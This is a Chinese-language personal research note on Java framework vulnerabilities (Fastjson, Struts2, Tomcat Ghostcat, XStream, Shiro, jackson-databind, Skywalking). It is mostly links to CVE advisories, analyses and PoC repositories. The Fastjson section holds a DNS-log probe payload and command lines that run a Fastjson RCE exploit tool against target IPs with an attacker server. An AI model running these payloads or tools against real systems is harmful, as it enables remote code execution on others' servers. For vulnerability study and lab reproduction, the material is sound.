# java 漏洞

https://www.upguard.com/blog/top-10-java-vulnerabilities-and-how-to-fix-them
https://snyk.io/blog/162-security-vulnerabilities-disclosed-in-javas-top-10-libraries-including-jackson-spring-and-jetty/

## java
https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-19117/Oracle-JRE.html
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=java
https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-19116/version_id-168996/Oracle-JDK-1.8.0.html

## spring

https://spring.io/projects/spring-boot
https://start.spring.io/

Spring Boot干货系列：（一）优雅的入门篇
http://tengj.top/2017/02/26/springboot1/

SpringMVC、SpringFramework与SpringBoot简单介绍
https://segmentfault.com/a/1190000021986315

Spring和SpringBoot比较，解惑区别
https://www.jianshu.com/p/ffe5ebe17c3a

## Fastjson

<!-- 
sec\udesk.sec.java.md
fastjson.20200325.md
-->

[Fastjson < 1.2.68版本反序列化漏洞分析篇](https://www.anquanke.com/post/id/219731)

[Fastjson68版本绕过autotype原理及利用场景分析](https://www.freebuf.com/vuls/240392.html)

[Fastjson <1.2.48 入门调试](https://www.anquanke.com/post/id/209915)

[Fastjson 1.2.24反序列化漏洞深度分析](https://www.anquanke.com/post/id/211035)

[Fastjson1.2.24漏洞复现详细过程](https://www.freebuf.com/articles/web/242712.html)

[不安全的序列化](https://www.freebuf.com/articles/web/244476.html)

[Fastjson批量检查及一键利用工具](https://www.freebuf.com/sectool/244113.html)

[fastjson<=1.2.62远程代码执行漏洞通告](https://www.anquanke.com/post/id/199527)


访问地址: 118.193.36.37:43170

{ "zeo": {"@type":"java.net.Inet4Address","val":"m9ng8n.dnslog.cn"]]
https://github.com/mrknow001/fastjson_rec_exploit
git clone git@github.com:mrknow001/fastjson_rec_exploit.git
118.89.54.172
python3 fastjson.py -u http://192.168.1.3/ -s 192.168.1.1 -c "touch /tmp/test.txt
python fastjson_rce_exploit.py -u http://192.168.56.107:8090/ -s 192.168.56.1 -c "touch /tmp/test.txt"

https://github.com/mrknow001/fastjson_rec_exploit/archive/master.zip

[vulhub](https://vulhub.org/)

[基础篇-XSS盲打](https://cloud.tencent.com/developer/article/1078996)


## Struts2

+ [x] Struts2 真的落后了吗? 是 https://github.com/apache/struts/releases 基本不更新了
+ [ ] 现在流行的又是什么? Spring+SpringMVC+Mybatis

Apache Struts 官方披 露S2-061 远程代码执行漏洞（ CVE-2020-17530 ）。
当开发人员强制使用OGNL解析时，某些特殊的TAG属性可能会被双重解析，进而导致远程代码执行。

参考链接： https://cwiki.apache.org/confluence/display/WW/S2-061

[内含POC丨漏洞复现之S2-061（CVE-2020-17530）](https://www.anquanke.com/post/id/225252)
[Struts2 S2-061漏洞分析(CVE-2020-17530)](https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g)


https://struts.apache.org/#
https://struts.apache.org/announce#a20201208

[Struts2-059 远程代码执行漏洞（CVE-2019-0230）分析](https://www.anquanke.com/post/id/216629)

Struts 2.3.24
https://archive.apache.org/dist/struts/2.3.24/struts-2.3.24-all.zip

TODO: idea创建 struts2项目: 应该需要升级idea
Failed to download 'http://central.maven.org/maven2/org/apache/struts/struts2-core/2.5.14.1/struts2-core-2.5.14.1.jar'
central.maven.org 这个域名已经没有了

        <url>https://repo1.maven.org/maven2</url>
https://stackoverflow.com/questions/62075914/intellij-create-sample-struts-web-project-with-java-then-show-this-error
because: "Beginning January 15, 2020, The Central Repository will no longer support communication over HTTP" (https://blog.sonatype.com/central-repository-moving-to-https)

[Struts2入门这一篇就够了](https://juejin.im/post/6844903573545811982)

## fastjson

[Fastjson历史漏洞研究（一）](https://www.anquanke.com/post/id/215753)

[FastJson历史漏洞研究（二）](https://www.anquanke.com/post/id/218268)

## Tomcat

### tomcat ghostcat Tomcat-Ajp

AJP Connector，它使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。
因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。

https://github.com/hypn0s/AJPy

[POC](https://github.com/0nise/CVE-2020-1938)

[tenable Nessus: CVE-2020-1938: Ghostcat](https://zh-cn.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487?tns_redirect=true)

[Apache Tomcat - AJP 'Ghostcat File Read/Inclusion](https://www.exploit-db.com/exploits/48143)

xray 长亭科技 tomcat ghostcat 扫描
https://www.chaitin.cn/zh/ghostcat

CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告
https://www.anquanke.com/post/id/199351

CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析
https://www.anquanke.com/post/id/199448

CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告
https://www.anquanke.com/post/id/199351

CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析
https://www.anquanke.com/post/id/199448

[Google Search XSS漏洞分析](https://www.anquanke.com/post/id/213422)
sanitize

### xstream

[20201214 CVE-2020-26258/26259：XStream 反序列化漏洞通告](https://www.anquanke.com/post/id/225489)
> [XStream 反序列化漏洞（CVE-2020-26258 & 26259）的复现与分析](https://www.anquanke.com/post/id/226241)
CVE-2020-26259 只要（运行 XStream 服务的）进程有足够的权限，那么当 XStream 在反序列化数据时，攻击者构造特定的XML/JSON 请求，可以造成任意文件删除。
CVE-2020-26258 运行 XStream 的服务在反序列化数据时，攻击者构造特定的 XML/JSON 请求，可以造成服务端请求伪造。

[20201119 XStream反序列化CVE-2020-26217漏洞分析](https://www.anquanke.com/post/id/222830)
[剖析xmlDecoder反序列化](https://www.anquanke.com/post/id/226575)
[以CVE-2020-8840为例分析Jackson漏洞](https://www.anquanke.com/post/id/226006)
[FastJson<=1.2.68RCE原理详细分析](https://www.anquanke.com/post/id/225439)

### shiro

最新安全版本： 1.7.1 <https://shiro.apache.org/security-reports.html>

[从Shiro权限绕过Getshell](https://www.freebuf.com/vuls/260202.html)
swagger 问题

[Apache Shiro 认证绕过分析（CVE-2020-17523）](https://www.anquanke.com/post/id/230935)

https://gitee.com/azhao-1981/shiro-cve-2020-17523

[CVE-2020-17523：Apache Shiro身份认证绕过漏洞通告](https://www.anquanke.com/post/id/230958)

[Shiro反序列化漏洞详细分析](https://www.anquanke.com/post/id/228889)

[Shiro权限绕过漏洞详细分析](https://www.anquanke.com/post/id/226899)

[Shiro反序列化的检测与利用](https://www.anquanke.com/post/id/227090)

[Apache Shiro权限绕过漏洞CVE-2020-11989分析](https://www.anquanke.com/post/id/222489)

[Java安全之Shiro 550反序列化漏洞分析](https://www.anquanke.com/post/id/225442)

[【安全通报】Shiro & Nexus Repository Manger 2/3 权限验证绕过漏洞（CVE-2020-13933）](https://nosec.org/home/detail/4591.html)

[一款检测Shiro反序列化的Burp插件](https://www.freebuf.com/sectool/244886.html)

[shiro < 1.6.0的认证绕过漏洞分析(CVE-2020-13933)](https://www.anquanke.com/post/id/214964)

https://start.spring.io/

[Shiro 权限绕过 CVE-2020-13933分析](https://www.anquanke.com/post/id/216096)

[Apache Shiro 权限绕过漏洞CVE-2020-11989](https://www.freebuf.com/vuls/249380.html)

[Apache Shiro权限绕过漏洞CVE-2020-1957](https://www.freebuf.com/vuls/249112.html)

[Java反序列化：Apache-Shiro复现分析](https://www.freebuf.com/articles/network/245019.html)

[Shiro-550 PoC 编写日记](https://www.anquanke.com/post/id/213751)

[【安全通报】Apache Shiro < 1.6.0 权限绕过漏洞（CVE-2020-13933）](https://nosec.org/home/detail/4531.html)

[【安全风险通告】Shiro又爆高危漏洞，Apache Shiro身份验证绕过漏洞安全风险通告](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247488670&idx=1&sn=e520554f545a6783994a9bc8100249ac)

https://sourcegraph.com/github.com/apache/shiro/-/compare/shiro-root-1.5.3...shiro-root-1.6.0
http://shiro.apache.org/10-minute-tutorial.html
git clone https://github.com/apache/shiro.git
git checkout shiro-root-1.6.0 -b shiro-root-1.6.0

gitee 镜像
https://gitee.com/projects/check_project_duplicate?import_url=https%3A%2F%2Fgithub.com%2Fapache%2Fshiro

需要登录
[shiro < 1.6.0的认证绕过漏洞分析(CVE-2020-13933)](https://www.anquanke.com/post/id/214964)

### jackson-databind

这个有记录，但没有评分
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jackson-databind+2.8.7
有评分，但不全
https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-42991/Fasterxml-Jackson-databind.html

http://www.nsfocus.net/index.php?os=&type_id=&keyword=jackson-databind&act=sec_bug&submit=+

Jackson反序列化漏洞（ CVE-2020-36188 ）从通告到POC
https://www.anquanke.com/post/id/227943

FasterXML jackson-databind远程代码执行漏洞
http://www.nsfocus.net/vulndb/48648
FasterXML jackson-databind 2.x<=Version <2.9.10.5
CVE(CAN) ID: CVE-2020-14061

http://www.nsfocus.net/vulndb/48653
FasterXML jackson-databind >=2.9.0
FasterXML jackson-databind <2.8.11.5
CVE(CAN) ID: CVE-2019-14893

http://www.nsfocus.net/vulndb/48650
FasterXML jackson-databind 2.x<=Version <2.9.10.5
CVE(CAN) ID: CVE-2020-14062

http://www.nsfocus.net/vulndb/48649
FasterXML jackson-databind 2.x<=Version <2.9.10.5
CVE(CAN) ID: CVE-2020-14060

CVE-2020-35728：FasterXML jackson-databind 2.x RCE漏洞|POC
https://github.com/Al1ex/CVE-2020-35728
[CVE-2020-8840: FasterXML/jackson-databind 远程代码执行漏洞通告](https://www.anquanke.com/post/id/199519)

从Java RMI反序列化到内网沦陷
https://www.anquanke.com/post/id/228569

## Skywalking

attack: Enterprise> Persistent> Server Software Component> Web Shell

[【安全通报】Skywalking 远程代码执行漏洞](https://nosec.org/home/detail/4678.html)


[【漏洞预警】Apache Skywalking GraphQL 注入与远程代码执行漏洞](https://help.aliyun.com/noticelist/articleid/1060803348.html?spm=5176.2020520154.sas.27.7dad5lTv5lTvEE)

Skywalking历史上存在两次sql注入漏洞，CVE-2020-9483、CVE-2020-13921
修复建议
升级Apache Skywalking 到最新的 v8.4.0 版本。
将默认H2数据库替换为其它支持的数据库。
